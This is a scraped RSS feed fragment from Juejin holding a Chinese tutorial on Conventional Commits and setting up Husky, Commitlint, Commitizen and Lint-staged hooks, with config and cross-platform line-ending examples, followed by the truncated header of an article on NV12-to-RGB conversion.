</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[把 Git 提交变成“可执行规范”：Commit 规范体系与 Husky/Commitlint/Commitizen/Lint-staged 全链路介绍]]></title>    <link>https://juejin.cn/post/7592789801708273705</link>    <guid>https://juejin.cn/post/7592789801708273705</guid>    <pubDate>2026-01-08T07:41:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592789801708273705" data-draft-id="7592540388298997823" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 把 Git 提交变成“可执行规范”：Commit 规范体系与 Husky/Commitlint/Commitizen/Lint-staged 全链路介绍"/> <meta itemprop="keywords" content="前端,代码规范"/> <meta itemprop="datePublished" content="2026-01-08T07:41:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="parade岁月"/> <meta itemprop="url" content="https://juejin.cn/user/3773179639113831"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             把 Git 提交变成“可执行规范”：Commit 规范体系与 Husky/Commitlint/Commitizen/Lint-staged 全链路介绍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3773179639113831/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    parade岁月
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:41:01.000Z" title="Thu Jan 08 2026 07:41:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本规范基于 <code>Conventional Commits</code> 思想，配合 <code>husky + commitlint + commitizen/cz-* + lint-staged</code> 工具链，在团队内统一提交历史的可读性与可维护性。</p>
<ul>
<li>规范定义：提交信息怎么写（所有人都遵守）</li>
<li>工具保障：本地提交时自动校验（尽量少靠“记住规则”）</li>
</ul>
<hr/>
<h2 data-id="heading-0">0. 概念与工具简介</h2>
<p>这一节用于快速理解“为什么要做这些约束”以及“每个工具各自负责什么”。</p>
<h3 data-id="heading-1">0.1 Conventional Commits（提交规范思想）</h3>
<p><code>Conventional Commits</code> 是一套约定式的提交信息格式，用结构化的 <code>&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;</code> 来表达变更意图，带来的收益包括：</p>
<ul>
<li>提交历史更可读，代码审查更高效</li>
<li>便于按类型生成变更日志（Changelog）</li>
<li>便于自动化流程（发布、版本号、回滚定位）</li>
</ul>
<h3 data-id="heading-2">0.2 Git Hook（Git 钩子）</h3>
<p>Git Hook 是 Git 在关键动作发生时触发脚本的机制。这里重点关注客户端钩子：</p>
<ul>
<li><code>pre-commit</code>：在写入 commit 之前执行，常用于代码检查/格式化/测试</li>
<li><code>commit-msg</code>：在写入 commit message 之后、最终落库之前执行，常用于校验提交信息格式</li>
</ul>
<h3 data-id="heading-3">0.3 Husky（Hook 管理）</h3>
<p><code>husky</code> 用来把 hook 以可维护的方式放进仓库（通常在 <code>.husky/</code> 目录），让团队成员在本地 <code>git commit</code> 时自动触发同一套脚本。</p>
<h3 data-id="heading-4">0.4 Commitlint（提交信息校验）</h3>
<p><code>commitlint</code> 用来校验 commit message 是否满足规则（例如 type 是否在允许列表、header 长度限制等）。它通常挂在 <code>commit-msg</code> hook 上，不通过就中止提交。</p>
<h3 data-id="heading-5">0.5 Commitizen 与适配器（交互式生成）</h3>
<p><code>commitizen</code> 提供交互式问答来生成 commit message，降低“靠记忆手写规范”的成本。</p>
<ul>
<li><code>commitizen</code> 本身是平台，需要配置一个适配器（adapter）</li>
<li>常见适配器：<code>cz-conventional-changelog</code>（经典、最小依赖）、<code>cz-git</code>（更灵活，可扩展中文/emoji 等）</li>
<li>命令：<code>git-cz</code>（以及等价的 <code>cz</code>）</li>
</ul>
<h3 data-id="heading-6">0.6 Lint-staged（只检查暂存区文件）</h3>
<p><code>lint-staged</code> 会自动获取 Git 暂存区（staged）的文件列表，并只对这些文件运行指定命令，避免每次提交都全量 lint。</p>
<h3 data-id="heading-7">0.7 它们如何协作（一次提交的执行顺序）</h3>
<p>当你执行 <code>git commit</code> 时，通常会按以下顺序发生：</p>
<ol start="0">
<li><code>pre-commit</code>：运行 <code>lint-staged</code>（对暂存区文件做校验/格式化）</li>
<li>编辑/生成 commit message：手写或使用 <code>commitizen</code></li>
<li><code>commit-msg</code>：运行 <code>commitlint</code>（校验 commit message）</li>
<li>通过后提交落库</li>
</ol>
<hr/>
<h2 data-id="heading-8">1. Commit Message 统一格式（必须）</h2>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>(<span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>)!: <span class="hljs-tag">&lt;<span class="hljs-name">subject</span>&gt;</span>
​
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
​
<span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span>
</code></pre>
<ul>
<li><code>&lt;type&gt;</code>：变更类型（必填，小写）</li>
<li><code>(&lt;scope&gt;)</code>：影响范围（可选，建议填）</li>
<li><code>!</code>：破坏性变更（Breaking Change，可选）</li>
<li><code>&lt;subject&gt;</code>：一句话概括变更（必填）</li>
<li><code>&lt;body&gt;</code>：为什么改、怎么改、影响点（可选，但推荐在复杂提交中填写）</li>
<li><code>&lt;footer&gt;</code>：关联 Issue/PR、Breaking Change 说明（可选）</li>
</ul>
<h3 data-id="heading-9">1.1 subject（必须）</h3>
<ul>
<li>用祈使句/动词开头（中文也等价）：例如“新增…/修复…/调整…”</li>
<li>简短、具体、可读：优先说明“做了什么”，而不是“改了什么文件”</li>
<li>不要以句号结尾；不要写无意义描述（如“update”、“fix bug”）</li>
<li>建议控制在 100 字符内（与 <code>commitlint</code> 的 <code>header-max-length</code> 保持一致）</li>
</ul>
<h3 data-id="heading-10">1.2 body（推荐）</h3>
<p>当变更不止一处、存在权衡或影响面较大时，建议写 body：</p>
<ul>
<li>背景/原因：为什么要改</li>
<li>方案/实现：怎么改的</li>
<li>影响/风险：有哪些兼容性或上线注意点</li>
</ul>
<h3 data-id="heading-11">1.3 footer（按需）</h3>
<ul>
<li>
<p>关联 Issue/任务：<code>Closes #123</code>、<code>Refs #123</code></p>
</li>
<li>
<p>破坏性变更（两种写法二选一）：</p>
<ul>
<li>在 header 里使用 <code>!</code></li>
<li>或在 footer 写：<code>BREAKING CHANGE: xxx</code></li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-12">2. type 与 scope 约定（必须统一）</h2>
<h3 data-id="heading-13">2.1 推荐 type 列表（建议与 commitlint 配置保持一致）</h3>






































































<table><thead><tr><th>type</th><th>用途</th><th>例子</th></tr></thead><tbody><tr><td>feat</td><td>新增功能</td><td><code>feat(auth): 支持短信登录</code></td></tr><tr><td>fix</td><td>修复缺陷</td><td><code>fix(router): 修复重定向死循环</code></td></tr><tr><td>docs</td><td>文档变更</td><td><code>docs: 更新安装说明</code></td></tr><tr><td>style</td><td>仅格式/样式（不影响逻辑）</td><td><code>style: 格式化代码</code></td></tr><tr><td>refactor</td><td>重构（非 feat/fix）</td><td><code>refactor(core): 拆分校验逻辑</code></td></tr><tr><td>perf</td><td>性能优化</td><td><code>perf(list): 优化首屏渲染</code></td></tr><tr><td>test</td><td>测试相关</td><td><code>test: 补充登录单测</code></td></tr><tr><td>build</td><td>构建/依赖/打包</td><td><code>build: 升级 pnpm 版本</code></td></tr><tr><td>ci</td><td>CI 配置与脚本</td><td><code>ci: 添加发布流水线</code></td></tr><tr><td>chore</td><td>杂项（不影响业务/功能）</td><td><code>chore: 更新依赖与脚手架配置</code></td></tr><tr><td>revert</td><td>回滚提交</td><td><code>revert: feat(auth): 支持短信登录</code></td></tr><tr><td>wip</td><td>开发中临时提交（慎用）</td><td><code>wip: 调试登录态</code></td></tr></tbody></table>
<p>建议：<code>wip</code> 仅用于个人分支；合并到主分支前应通过 <code>rebase/squash</code> 清理成有意义的提交。</p>
<h3 data-id="heading-14">2.2 scope 取值建议（可选但推荐）</h3>
<p>scope 用来说明影响范围，建议使用“模块/领域/目录名”，保持短且稳定：</p>
<ul>
<li>业务域：<code>auth</code>、<code>user</code>、<code>order</code></li>
<li>基础设施：<code>router</code>、<code>store</code>、<code>api</code></li>
<li>工程化：<code>build</code>、<code>ci</code>、<code>deps</code></li>
<li>文档/配置：<code>readme</code>、<code>eslint</code>、<code>prettier</code></li>
</ul>
<hr/>
<h2 data-id="heading-15">3. 示例（直接照抄即可）</h2>
<ul>
<li>普通提交：<code>feat: 新增导出功能</code></li>
<li>带 scope：<code>fix(auth): 修复 token 刷新失败</code></li>
<li>破坏性变更：<code>feat(api)!: 调整用户接口返回结构</code></li>
</ul>
<p>带 body/footer：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">feat</span>(user): 新增个人资料编辑
​
- 支持头像上传与裁剪
- 增加输入校验与错误提示
​
Closes <span class="hljs-number">#123</span>
</code></pre>
<hr/>
<h2 data-id="heading-16">4. 工具链落地（一）：提交信息规范（commitlint + commitizen）</h2>
<p>目标：在本地拦截不合规的 commit message，并提供低成本的规范化提交方式。</p>
<h3 data-id="heading-17">4.1 安装依赖</h3>
<pre><code class="hljs language-sql" lang="sql">pnpm <span class="hljs-keyword">add</span> <span class="hljs-operator">-</span>D husky <span class="hljs-variable">@commitlint</span><span class="hljs-operator">/</span>cli <span class="hljs-variable">@commitlint</span><span class="hljs-operator">/</span>config<span class="hljs-operator">-</span>conventional commitizen
</code></pre>
<h3 data-id="heading-18">4.2 初始化 Husky</h3>
<pre><code class="hljs language-bash" lang="bash">pnpm <span class="hljs-built_in">exec</span> husky init
</code></pre>
<p>初始化后通常会发生这些变化（以 Husky 9+ 为例）：</p>
<ul>
<li>新增 <code>.husky/</code> 目录（用于存放 hooks）</li>
<li>生成 <code>.husky/pre-commit</code>（Husky 初始化会放一个默认示例，常见默认内容是 <code>pnpm test</code>，可按项目需要改成 <code>lint-staged</code>）</li>
<li>在 <code>package.json</code> 写入/更新 <code>prepare</code> 脚本，确保安装依赖后会自动启用 hooks</li>
</ul>
<p>确保 <code>package.json</code> 至少包含：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"prepare"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"husky"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-19">4.3 第一步：只配置 commitlint（先校验，再引导）</h3>
<ol start="0">
<li>创建 <code>commitlint.config.ts</code>：</li>
</ol>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-keyword">extends</span>: [<span class="hljs-string">'@commitlint/config-conventional'</span>],
}
</code></pre>
<blockquote>
<p>后续根据需求可丰富配置</p>
</blockquote>
<ol start="2">
<li>配置 <code>.husky/commit-msg</code>：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">pnpm <span class="hljs-built_in">exec</span> commitlint --edit <span class="hljs-variable">$1</span>
</code></pre>
<p>关于 <code>pnpm exec</code> 与 <code>pnpm dlx</code>：</p>
<ul>
<li><code>pnpm exec</code>：执行<strong>当前项目已安装</strong>的依赖（从 <code>node_modules/.bin</code> 解析可执行文件）；团队协作下更稳定、版本可控（推荐）</li>
<li><code>pnpm dlx</code>：临时下载并执行某个包（一次性运行工具时方便），但版本可能随时间变化，不适合作为仓库长期 hooks 依赖</li>
</ul>
<p><code>pnpm exec commitlint --edit $1</code> 的工作流程（简述）：</p>
<ol start="0">
<li><code>git commit</code> 触发 <code>commit-msg</code> hook</li>
<li>Husky 执行 <code>.husky/commit-msg</code></li>
<li><code>pnpm exec</code> 在当前项目中解析到 <code>commitlint</code> 可执行文件</li>
<li><code>commitlint</code> 读取 <code>commitlint.config.*</code> 等配置</li>
<li><code>commitlint</code> 读取 <code>$1</code> 指向的 commit message 临时文件并校验</li>
<li>校验失败返回非 0，Git 中止提交；校验通过则继续提交</li>
</ol>
<h4 data-id="heading-20">阶段总结</h4>
<ul>
<li>现在使用 <code>git commit -m "..."</code> 提交时，如果 message 不符合规范，会被直接拦截</li>
<li>但这一步仍依赖“手写 message”，对新人或高频提交场景不够友好</li>
</ul>
<h3 data-id="heading-21">4.4 第二步：配置 commitizen（交互式生成 commit message）</h3>
<p>当你安装 <code>commitizen</code> 后，会获得两个等价命令：</p>
<ul>
<li><code>git-cz</code>：完整命令名，更直观（推荐）</li>
<li><code>cz</code>：简写别名，输入更短</li>
</ul>
<p>它们都用于启动交互式提交流程，差别仅在命令名。</p>
<ol start="0">
<li>选择一个适配器（二选一安装）：</li>
</ol>
<pre><code class="hljs language-csharp" lang="csharp">pnpm <span class="hljs-keyword">add</span> -D cz-conventional-changelog
<span class="hljs-meta"># 或</span>
pnpm <span class="hljs-keyword">add</span> -D cz-git
</code></pre>
<ol start="2">
<li>在 <code>package.json</code> 中配置适配器：</li>
</ol>
<ul>
<li>使用 <code>cz-conventional-changelog</code>：</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">"config"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"commitizen"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cz-conventional-changelog"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li>使用 <code>cz-git</code>：</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">"config"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"commitizen"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cz-git"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
</code></pre>
<ol start="3">
<li>增加统一入口脚本（推荐）：</li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"commit"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"git-cz"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
</code></pre>
<p>提交方式：</p>
<pre><code class="hljs language-sql" lang="sql">git <span class="hljs-keyword">add</span> <span class="hljs-operator">-</span>A
pnpm <span class="hljs-keyword">commit</span>
</code></pre>
<h4 data-id="heading-22">阶段总结</h4>
<ul>
<li>现在团队可以通过交互式方式生成规范 message，出错率显著降低</li>
<li><code>commitlint</code> 仍然保留：即使有人绕过交互手写 message，也会被校验兜底</li>
</ul>
<hr/>
<h2 data-id="heading-23">5. 工具链落地（二）：pre-commit 校验（lint-staged）</h2>
<p>目标：在提交前只对“暂存区文件”执行校验/格式化，避免把不合规代码带进仓库。</p>
<h3 data-id="heading-24">5.1 安装依赖</h3>
<pre><code class="hljs language-csharp" lang="csharp">pnpm <span class="hljs-keyword">add</span> -D lint-staged
</code></pre>
<p>说明：<code>lint-staged</code> 只负责“挑选暂存区文件并运行命令”，并不自带规则；你需要自行选择并配置 <code>eslint/prettier/stylelint</code> 等工具。</p>
<h3 data-id="heading-25">5.2 配置 lint-staged（示例）</h3>
<p>创建 <code>.lintstagedrc.json</code>：</p>
<pre><code class="hljs language-less" lang="less">{
  "*.{<span class="hljs-selector-tag">js</span>,<span class="hljs-selector-tag">jsx</span>,<span class="hljs-selector-tag">ts</span>,<span class="hljs-selector-tag">tsx</span>,<span class="hljs-selector-tag">vue</span>}": <span class="hljs-selector-attr">[<span class="hljs-string">"eslint --fix --cache"</span>]</span>,
  "*.{<span class="hljs-selector-tag">css</span>,<span class="hljs-selector-tag">scss</span>,<span class="hljs-selector-tag">sass</span>,<span class="hljs-selector-tag">less</span>,<span class="hljs-selector-tag">vue</span>}": <span class="hljs-selector-attr">[<span class="hljs-string">"stylelint --fix"</span>]</span>,
  "*.{<span class="hljs-selector-tag">js</span>,<span class="hljs-selector-tag">jsx</span>,<span class="hljs-selector-tag">ts</span>,<span class="hljs-selector-tag">tsx</span>,<span class="hljs-selector-tag">vue</span>,<span class="hljs-selector-tag">css</span>,<span class="hljs-selector-tag">scss</span>,<span class="hljs-selector-tag">sass</span>,<span class="hljs-selector-tag">less</span>,<span class="hljs-selector-tag">json</span>,<span class="hljs-selector-tag">md</span>,<span class="hljs-selector-tag">html</span>}": <span class="hljs-selector-attr">[<span class="hljs-string">"prettier --write"</span>]</span>
}
</code></pre>
<h3 data-id="heading-26">5.3 配置 pre-commit hook</h3>
<p>编辑 <code>.husky/pre-commit</code>：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm <span class="hljs-built_in">exec</span> lint-staged
</code></pre>
<h4 data-id="heading-27">阶段总结</h4>
<ul>
<li>现在每次提交都会自动对暂存区文件做校验/格式化</li>
<li>不通过则提交失败，从源头减少“提交后才发现 lint 报错/格式不统一”的成本</li>
</ul>
<hr/>
<h2 data-id="heading-28">6. 跨平台一致性（强烈建议）</h2>
<p>目标：避免 Windows/macOS/Linux 换行符差异导致的“无意义 diff”。</p>
<h3 data-id="heading-29">6.1 <code>.editorconfig</code>（编辑器层）</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">root</span> = <span class="hljs-literal">true</span>
​
<span class="hljs-section">[*]</span>
<span class="hljs-attr">charset</span> = utf-<span class="hljs-number">8</span>
<span class="hljs-attr">indent_style</span> = space
<span class="hljs-attr">indent_size</span> = <span class="hljs-number">2</span>
<span class="hljs-attr">end_of_line</span> = lf
<span class="hljs-attr">insert_final_newline</span> = <span class="hljs-literal">true</span>
<span class="hljs-attr">trim_trailing_whitespace</span> = <span class="hljs-literal">true</span>
​
<span class="hljs-section">[*.md]</span>
<span class="hljs-attr">trim_trailing_whitespace</span> = <span class="hljs-literal">false</span>
</code></pre>
<h3 data-id="heading-30">6.2 <code>.gitattributes</code>（Git 层）</h3>
<pre><code class="hljs language-vbnet" lang="vbnet">* <span class="hljs-keyword">text</span>=<span class="hljs-keyword">auto</span> eol=lf
​
*.png  <span class="hljs-keyword">binary</span>
*.jpg  <span class="hljs-keyword">binary</span>
*.jpeg <span class="hljs-keyword">binary</span>
*.gif  <span class="hljs-keyword">binary</span>
*.pdf  <span class="hljs-keyword">binary</span>
</code></pre>
<h3 data-id="heading-31">6.3 <code>.editorconfig</code> vs <code>.gitattributes</code>（区别与配合）</h3>
<p>两者经常一起用，但关注点不同：</p>
<ul>
<li>生效层级不同：<code>.editorconfig</code> 影响“编辑器/格式化器在保存时怎么写文件”，<code>.gitattributes</code> 影响“Git 在检出/提交时怎么规范化文件”</li>
<li>解决问题不同：<code>.editorconfig</code> 统一缩进、编码、行尾空白、是否保留末尾换行；<code>.gitattributes</code> 统一换行符、标记二进制文件（避免 diff 乱码）、以及 diff/merge 策略等</li>
<li>最佳实践：两者配合使用，既约束开发时的写入行为，也保证仓库层面的跨平台一致性</li>
</ul>
<hr/>
<h2 data-id="heading-32">7. 常见问题（排障速查）</h2>
<ul>
<li>Husky 不生效：确认执行过 <code>pnpm install</code> 且 <code>prepare</code> 脚本已运行；必要时检查 <code>git config core.hooksPath</code> 是否指向 <code>.husky</code></li>
<li>紧急绕过校验：<code>git commit --no-verify</code>（仅限紧急情况，后续需补规范提交）</li>
<li>Windows 下交互提交体验不佳：优先使用 <code>pnpm commit</code>，不要强制在 hook 中进入交互式界面</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[NV12 转 RGB 完整指南]]></title>    <link>https://juejin.cn/post/7592515924701724707</link>    <guid>https://juejin.cn/post/7592515924701724707</guid>    <pubDate>2026-01-08T07:48:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592515924701724707" data-draft-id="7592622563545956387" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="NV12 转 RGB 完整指南"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-08T07:48:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="悠哉摸鱼大王"/> <meta itemprop="url" content="https://juejin.cn/user/3606845069731848"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            NV12 转 RGB 完整指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3606845069731848/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    悠哉摸鱼大王
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:48:15.000Z" title="Thu Jan 08 2026 07:48:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    15
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
